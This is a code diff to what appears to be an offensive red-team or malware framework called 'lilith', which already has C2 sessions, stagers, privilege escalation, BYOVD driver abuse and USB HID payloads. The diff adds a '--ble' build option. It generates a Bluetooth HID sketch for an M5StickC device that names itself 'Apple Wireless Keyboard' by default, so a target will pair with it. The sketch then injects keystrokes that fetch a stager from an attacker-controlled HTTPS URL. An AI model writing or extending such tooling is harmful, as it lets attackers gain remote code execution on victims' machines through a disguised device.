@@ -33,6 +33,7 @@ from builders.stager  import generate_stager, generate_escalation_chain_params
 from builders.runner  import build_runner, build_runner_sc, build_runner_sc_c2
 from builders.byovd   import build_byovd, build_byovd_sc
 from builders.usbhid  import build_usb_payload, DEVICES as USB_DEVICES
+from builders.blehid  import build_ble_payload, DEVICES as BLE_DEVICES
 from server.https_server import start_server, get_c2_sessions, _c2_push_task, _c2_get_result
 
 
@@ -375,10 +376,27 @@ def cmd_build(args, cfg, ws):
         build_usb_payload(stager_url, usb_out, device=usb_dev, boot_delay_ms=usb_boot)
         did_something = True
 
+    # ── BLE HID payload (M5StickC Plus2) ─────────────────────────────────────
+    if getattr(args, "ble", None) is not None:
+        tname = args.ble or "__c2_agent__"
+        stager_name = ws._load_manifest().get(f"stager_{tname}")
+        if not stager_name:
+            hint = "lilith build --c2-stager" if tname == "__c2_agent__" else f"lilith build --stager {tname}"
+            print(f"[!] No stager found for '{tname}' — run: {hint}")
+            sys.exit(1)
+        scheme     = "https"
+        url_prefix = cfg.get("url_prefix", "/cdn/static/v3")
+        stager_url = f"{scheme}://{lhost}:{port}{url_prefix}/{stager_name}"
+        ble_out    = getattr(args, "ble_out",  None) or ws.path("ble")
+        ble_dev    = getattr(args, "ble_device", "m5stick")
+        ble_name   = getattr(args, "ble_name",   "Apple Wireless Keyboard")
+        build_ble_payload(stager_url, ble_out, device=ble_dev, ble_name=ble_name)
+        did_something = True
+
     if not did_something:
         print("[!] Nothing to build — specify --runner, --tool NAME, --tools, --stager NAME,")
         print("    --stagers, --all, --escalate POTATO --system-tool TOOL,")
-        print("    --shellcode FILE --name NAME, --c2-stager, --byovd, or --usb TOOL")
+        print("    --shellcode FILE --name NAME, --c2-stager, --byovd, --usb TOOL, or --ble TOOL")
 
 
 def _build_persist_cmd(persist_type: str, cfg: dict, ws: Workspace) -> str | None:
@@ -825,6 +843,15 @@ def main():
                          help="Output directory for payload files (default: <workspace>/usb/)")
     build_p.add_argument("--usb-boot-delay", metavar="MS",   dest="usb_boot_delay", type=int, default=2000,
                          help="USB enumeration + HID driver wait in ms (default: 2000, increase for slow targets)")
+    build_p.add_argument("--ble",            metavar="TOOL",  dest="ble", nargs="?", const="__c2_agent__",
+                         help="Generate BLE HID sketch for M5StickC Plus2 (tool name, or bare --ble for C2 agent stager)")
+    build_p.add_argument("--ble-device",     metavar="TYPE",  dest="ble_device", default="m5stick",
+                         choices=list(BLE_DEVICES) + ["all"],
+                         help="BLE device type: m5stick | bruce | all  (default: m5stick)")
+    build_p.add_argument("--ble-out",        metavar="DIR",   dest="ble_out",    default=None,
+                         help="Output directory for BLE sketch folder (default: <workspace>/ble/)")
+    build_p.add_argument("--ble-name",       metavar="NAME",  dest="ble_name",   default="Apple Wireless Keyboard",
+                         help="BLE device name shown on target pairing dialog (default: 'Apple Wireless Keyboard')")
 
     serve_p = sub.add_parser("serve", help="Start HTTPS server + callback listener")
     serve_p.add_argument("--port",      type=int, metavar="PORT", help="Override http_port from config")
